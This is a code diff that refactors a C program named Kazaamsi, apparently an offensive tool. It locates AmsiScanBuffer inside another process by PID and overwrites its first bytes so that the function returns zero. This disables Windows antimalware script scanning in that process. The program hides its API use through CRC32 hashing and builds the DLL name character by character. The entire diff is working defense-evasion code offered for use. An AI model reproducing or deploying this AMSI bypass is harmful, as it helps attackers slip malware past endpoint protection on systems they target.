@@ -4,6 +4,10 @@
 #include "structs.h"
 #include "hashutils.h"
 
+#define PATCH_BYTES "\x31\xC0\xC3"
+#define PATCH_LEN 3
+#define PAGE_SIZE 0x1000
+
 BOOL g_Verbose = FALSE;
 
 typedef HMODULE(WINAPI* fnLoadLibraryA)(LPCSTR);
@@ -24,201 +28,203 @@ typedef struct _WIN32_API {
     fnModule32NextW             pModule32NextW;
     fnCloseHandle               pCloseHandle;
     fnOpenProcess               pOpenProcess;
-}WIN32_API, * PWIN32_API;
+} WIN32_API, * PWIN32_API;
 
-BOOL InitializeWin32Api(PWIN32_API pWin32Apis) {
-  //  UINT32   k32hash = KERNEL32_CRC32;
-    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_CRC32);
+void ToUpperA(char* out, const char* in, size_t len) {
+    for (size_t i = 0; i < len; i++) {
+        out[i] = (in[i] >= 'a' && in[i] <= 'z') ? (in[i] - 'a' + 'A') : in[i];
+    }
+}
 
-    if (!hKernel32) {
+BOOL InitializeWin32Api(PWIN32_API pWin32api) {
+    HMODULE hKernel32 = NULL; 
+
+    if (!(hKernel32 = GetModuleHandleH(KERNEL32_CRC32))) {
         printf("[!] Failed to locate kernel32.dll.\n");
         return FALSE;
     }
     if (g_Verbose)
-        printf("[>] Found kernel32.dll at: 0x%p\n", hKernel32);
+        printf("[>] kernel32.dll base address: 0x%p\n", hKernel32);
 
-    pWin32Apis->pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(hKernel32, LoadLibraryA_CRC32);
-    pWin32Apis->pVirtualProtectEx = (fnVirtualProtectEx)GetProcAddressH(hKernel32, VirtualProtectEx_CRC32);
-    pWin32Apis->pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressH(hKernel32, WriteProcessMemory_CRC32);
-    pWin32Apis->pCreateToolhelp32Snapshot = (fnCreateToolhelp32Snapshot)GetProcAddressH(hKernel32, CreateToolhelp32Snapshot_CRC32);
-    pWin32Apis->pModule32FirstW = (fnModule32FirstW)GetProcAddressH(hKernel32, Module32FirstW_CRC32);
-    pWin32Apis->pModule32NextW = (fnModule32NextW)GetProcAddressH(hKernel32, Module32NextW_CRC32);
-    pWin32Apis->pCloseHandle = (fnCloseHandle)GetProcAddressH(hKernel32, CloseHandle_CRC32);
-    pWin32Apis->pOpenProcess = (fnOpenProcess)GetProcAddressH(hKernel32, OpenProcess_CRC32);
+    pWin32api->pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(hKernel32, LoadLibraryA_CRC32);
+    pWin32api->pVirtualProtectEx = (fnVirtualProtectEx)GetProcAddressH(hKernel32, VirtualProtectEx_CRC32);
+    pWin32api->pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressH(hKernel32, WriteProcessMemory_CRC32);
+    pWin32api->pCreateToolhelp32Snapshot = (fnCreateToolhelp32Snapshot)GetProcAddressH(hKernel32, CreateToolhelp32Snapshot_CRC32);
+    pWin32api->pModule32FirstW = (fnModule32FirstW)GetProcAddressH(hKernel32, Module32FirstW_CRC32);
+    pWin32api->pModule32NextW = (fnModule32NextW)GetProcAddressH(hKernel32, Module32NextW_CRC32);
+    pWin32api->pCloseHandle = (fnCloseHandle)GetProcAddressH(hKernel32, CloseHandle_CRC32);
+    pWin32api->pOpenProcess = (fnOpenProcess)GetProcAddressH(hKernel32, OpenProcess_CRC32);
 
-    if (!pWin32Apis->pLoadLibraryA || !pWin32Apis->pVirtualProtectEx || !pWin32Apis->pWriteProcessMemory ||
-        !pWin32Apis->pCreateToolhelp32Snapshot || !pWin32Apis->pModule32FirstW ||
-        !pWin32Apis->pModule32NextW || !pWin32Apis->pCloseHandle || !pWin32Apis->pOpenProcess) {
+    if (!pWin32api->pLoadLibraryA || !pWin32api->pVirtualProtectEx || !pWin32api->pWriteProcessMemory ||
+        !pWin32api->pCreateToolhelp32Snapshot || !pWin32api->pModule32FirstW ||
+        !pWin32api->pModule32NextW || !pWin32api->pCloseHandle || !pWin32api->pOpenProcess) {
         printf("[!] Failed to resolve one or more kernel32 functions.\n");
         return FALSE;
-    }
-
-    if (g_Verbose) {
-        printf("[>] LoadLibraryA: 0x%p\n", (PVOID)pWin32Apis->pLoadLibraryA);
-        printf("[>] VirtualProtectEx: 0x%p\n", (PVOID)pWin32Apis->pVirtualProtectEx);
-        printf("[>] WriteProcessMemory: 0x%p\n", (PVOID)pWin32Apis->pWriteProcessMemory);
-        printf("[>] CreateToolhelp32Snapshot: 0x%p\n", (PVOID)pWin32Apis->pCreateToolhelp32Snapshot);
-        printf("[>] Module32FirstW: 0x%p\n", (PVOID)pWin32Apis->pModule32FirstW);
-        printf("[>] Module32NextW: 0x%p\n", (PVOID)pWin32Apis->pModule32NextW);
-        printf("[>] CloseHandle: 0x%p\n", (PVOID)pWin32Apis->pCloseHandle);
-        printf("[>] OpenProcess: 0x%p\n", (PVOID)pWin32Apis->pOpenProcess);
     }
 
     return TRUE;
 }
 
-PVOID GetRemoteModBase(DWORD targetPid, DWORD moduleHash, WIN32_API api) {
-    
-    MODULEENTRY32   modEntry        =   { 0 };
-                    modEntry.dwSize =   sizeof(modEntry);
+PVOID GetRemoteModBase(DWORD dwPid, DWORD dwModHash, WIN32_API win32api) {
+    MODULEENTRY32 modEntry;
+    HANDLE hSnapshot;
+    char modNameA[MAX_PATH] = { 0 };
+    char upperModNameA[MAX_PATH] = { 0 };
+    SIZE_T nameLen = 0;
 
-    HANDLE hSnapshot = api.pCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, targetPid);
+    modEntry.dwSize = sizeof(modEntry);
+    hSnapshot = win32api.pCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPid);
 
     if (hSnapshot == INVALID_HANDLE_VALUE) {
         printf("[!] CreateToolhelp32Snapshot failed. Error: %d\n", GetLastError());
         return NULL;
     }
-    // Convert to ascii then compare hash
-    if (api.pModule32FirstW(hSnapshot, &modEntry)) {
+
+    if (win32api.pModule32FirstW(hSnapshot, &modEntry)) {
         do {
-                char    modNameA[MAX_PATH] = { 0 },
-                        upperModNameA[MAX_PATH]    = { 0 };
-                DWORD   thisModHash;
+            memset(modNameA, 0, MAX_PATH);
+            memset(upperModNameA, 0, MAX_PATH);
 
             WideCharToMultiByte(CP_ACP, 0, modEntry.szModule, -1, modNameA, MAX_PATH, NULL, NULL);
- 
-            for (int i = 0; i < sizeof(modNameA); i++) {
-                if (modNameA[i] >= 'a' && modNameA[i] <= 'z')
-                    upperModNameA[i] = modNameA[i] - 'a' + 'A';
-                else
-                    upperModNameA[i] = modNameA[i];
-            }
-            
-            // Hash and compare
-            thisModHash = CRC32BA(upperModNameA);
-            
-            if (thisModHash == moduleHash) {
-                CloseHandle(hSnapshot);
+            nameLen = strlen(modNameA);
+            ToUpperA(upperModNameA, modNameA, nameLen);
+
+            if (CRC32BA(upperModNameA) == dwModHash) {
+                if (g_Verbose)
+                    printf("[>] %s base address: 0x%p\n", modNameA, modEntry.modBaseAddr);
+                win32api.pCloseHandle(hSnapshot);
                 return modEntry.modBaseAddr;
             }
-        } while (api.pModule32NextW(hSnapshot, &modEntry));
+        } while (win32api.pModule32NextW(hSnapshot, &modEntry));
+    }
+    else {
+        printf("[!] Module32FirstW failed. Error: %d\n", GetLastError());
     }
 
-    api.pCloseHandle(hSnapshot);
+    win32api.pCloseHandle(hSnapshot);
     return NULL;
 }
 
-PVOID GetRemoteFuncAddr(IN DWORD dwTargetPid, WIN32_API api) {  
-    
-    char dllNameA[]      =      { 'a','m','s','i','.','d','l','l', 0 };
+BOOL GetRemoteAddress(IN DWORD dwPid, IN WIN32_API win32api, PVOID* ppBuffer) {
+    char dllNameA[] = { 'a','m','s','i','.','d','l','l', 0 };
+    HMODULE hModBase = NULL;
+    PBYTE pFuncAddr = NULL;
+    SIZE_T offset = 0;
+    PBYTE pRemoteModBase = NULL;
+    PVOID pRemoteFuncAddr = NULL;
 
-    HMODULE hLocalMod = api.pLoadLibraryA(dllNameA);
-    if (!hLocalMod) {
+   if (!(hModBase = win32api.pLoadLibraryA(dllNameA))) {
         printf("[!] LoadLibraryA failed. Error: %d\n", GetLastError());
-        return NULL;
+        return FALSE;
     }
 
-    PBYTE localFuncAddr = (PBYTE)GetProcAddressH(hLocalMod, AmsiScanBuffer_CRC32);
-    if (!localFuncAddr) {
+    if (!(pFuncAddr = (PBYTE)GetProcAddressH(hModBase, AmsiScanBuffer_CRC32))) {
         printf("[!] GetProcAddress failed. Error: %d\n", GetLastError());
-        return NULL;
-    }
-    SIZE_T funcOffset = (SIZE_T)(localFuncAddr - (PBYTE)hLocalMod);
-
-    PBYTE remoteBaseAddr = (PBYTE)GetRemoteModBase(dwTargetPid, AMSI_CRC32, api);
-    if (!remoteBaseAddr) {
-        printf("[!] Failed to find target module in remote process.\n");
-        return NULL;
+        return FALSE;
     }
 
-    PVOID remoteFuncAddr = remoteBaseAddr + funcOffset;
+    offset = (SIZE_T)(pFuncAddr - (PBYTE)hModBase);
+
+    if (!(pRemoteModBase = (PBYTE)GetRemoteModBase(dwPid, AMSI_CRC32, win32api))) {
+        printf("[!] Failed to locate remote AMSI module.\n");
+        return FALSE;
+    }
+
+    pRemoteFuncAddr = pRemoteModBase + offset;
     if (g_Verbose)
-        printf("[>] Remote AmsiScanBuffer address: 0x%p\n", remoteFuncAddr);
+        printf("[>] Located target address: 0x%p\n", pRemoteFuncAddr);
 
-    return remoteFuncAddr;
+    *ppBuffer = pRemoteFuncAddr;
+    return TRUE;
 }
 
-BOOL PatchRemoteFunc(HANDLE hProcess, PVOID pRemoteFunc, WIN32_API api) {   
-
-    char patchBytes[] = { 0x31, 0xC0, 0xC3 };
+BOOL GetProcessHandle(IN DWORD dwPid, IN WIN32_API win32api, OUT PHANDLE phProcess) {
+    DWORD dwAccess = PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
+    HANDLE hProcess = NULL;
     
-    PVOID  pageBase = pRemoteFunc;
-    SIZE_T pageSize = 0x1000;
-    DWORD  oldProtect = 0;
+    if (g_Verbose)
+        printf("[>] Opening process handle to PID %lu.\n", dwPid);
 
-    // change page to read/write
-    if (!api.pVirtualProtectEx(hProcess, pageBase, pageSize, PAGE_READWRITE, &oldProtect)) {
+    if (!(hProcess = win32api.pOpenProcess(dwAccess, FALSE, dwPid))) {
+        printf("[!] OpenProcess failed. Error: %d\n", GetLastError());
+        return FALSE;
+    }
+
+    *phProcess = hProcess;
+    return TRUE;
+}
+
+BOOL PatchRemoteProcess(IN HANDLE hProcess, IN PVOID pAddress, IN WIN32_API win32api) {
+    char patchBytes[] = PATCH_BYTES;
+    PVOID pageBase = (PVOID)((ULONG_PTR)pAddress & ~(PAGE_SIZE - 1));
+    DWORD oldProtect = 0;
+
+    if (!win32api.pVirtualProtectEx(hProcess, pageBase, PAGE_SIZE, PAGE_READWRITE, &oldProtect)) {
         printf("[!] VirtualProtectEx failed: %u\n", GetLastError());
         return FALSE;
     }
 
-    // write patch bytes
-    if (!api.pWriteProcessMemory(hProcess, pRemoteFunc, patchBytes, sizeof(patchBytes), NULL)) {
+    if (!win32api.pWriteProcessMemory(hProcess, pAddress, patchBytes, PATCH_LEN, NULL)) {
         printf("[!] WriteProcessMemory failed: %u\n", GetLastError());
         return FALSE;
     }
 
-    // restore original protection
-    if (!api.pVirtualProtectEx(hProcess, pageBase, pageSize, oldProtect, &oldProtect)) {
-        printf("[!] VirtualProtectEx (restore) failed: %u\n", GetLastError());
+    if (!win32api.pVirtualProtectEx(hProcess, pageBase, PAGE_SIZE, oldProtect, &oldProtect)) {
+        printf("[!] Failed to restore memory protection. Error: %u\n", GetLastError());
         return FALSE;
     }
 
-    printf("[>] Patch applied successfully.\n");
+    printf("[>] Process successfully patched.\n");
     return TRUE;
+}
 
+BOOL ParseArguments(int argc, char** argv, OUT DWORD* pdwPid, OUT BOOL* pVerbose) {
+    if (argc < 2 || argc > 3)  {
+        printf("Usage: Kazaamsi.exe <PID> [-v]\n");
+        return FALSE;
+    }
+
+    if ((*pdwPid = strtoul(argv[1], NULL, 10)) == 0) {
+        printf("[!] Invalid PID: %s\n", argv[1]);
+        return FALSE;
+    }
+
+    *pVerbose = (argc == 3 && strcmp(argv[2], "-v") == 0);
+    return TRUE;
 }
 
 int main(int argc, char** argv) {
+    WIN32_API api = { 0 };
+    DWORD dwRemotePid = 0;
+    PVOID pRemoteAddr = NULL;
+    HANDLE hRemoteProc = NULL;
 
-    WIN32_API       api         =   { 0 };
-    DWORD           targetPid   =   0;
-    PVOID           targetFunc  =   NULL;
-
-    if (argc < 2 || argc > 3) {
-        printf("Usage: Kazaamsi.exe <PID> [-v]\n");
+    if (!ParseArguments(argc, argv, &dwRemotePid, &g_Verbose))
         return -1;
-    }
-
-    targetPid = strtoul(argv[1], NULL, 10);
-    if (targetPid == 0) {
-        printf("[!] Invalid PID: %s\n", argv[1]);
-        return -1;
-    }
-
-    g_Verbose = (argc == 3 && strcmp(argv[2], "-v") == 0);
 
     if (!InitializeWin32Api(&api)) {
-        printf("[!] Could not resolve APIs.\n");
+        printf("[!] Could not resolve required APIs.\n");
         return -1;
     }
 
-    targetFunc = GetRemoteFuncAddr(targetPid, api);
-    if (!targetFunc) {
-        printf("[!] Failed to calculate remote function address.\n");
+    if (!GetRemoteAddress(dwRemotePid, api, &pRemoteAddr)) {
+        printf("[!] Failed to resolve target function address.\n");
         return -1;
     }
 
-    if (g_Verbose)
-        printf("[>] Opening handle to PID %lu...\n", targetPid);
-
-    HANDLE hProcess = api.pOpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, targetPid);
-    if (!hProcess) {
-        printf("[!] OpenProcess failed. Error: %d\n", GetLastError());
+    if (!GetProcessHandle(dwRemotePid, api, &hRemoteProc)) {
+        printf("[!] Failed to obtain process handle.\n");
         return -1;
     }
 
-    if (g_Verbose)
-        printf("[>] Applying patch to remote process...\n");
-
-    if (!PatchRemoteFunc(hProcess, targetFunc, api)) {
-        api.pCloseHandle(hProcess);
+    if (!PatchRemoteProcess(hRemoteProc, pRemoteAddr, api)) {
+        api.pCloseHandle(hRemoteProc);
         return -1;
     }
 
     if (g_Verbose)
-        printf("[>] Cleaning up...\n");
+        printf("[>] Cleaning up\n");
 
-    api.pCloseHandle(hProcess);
+    api.pCloseHandle(hRemoteProc);
     return 0;
 }
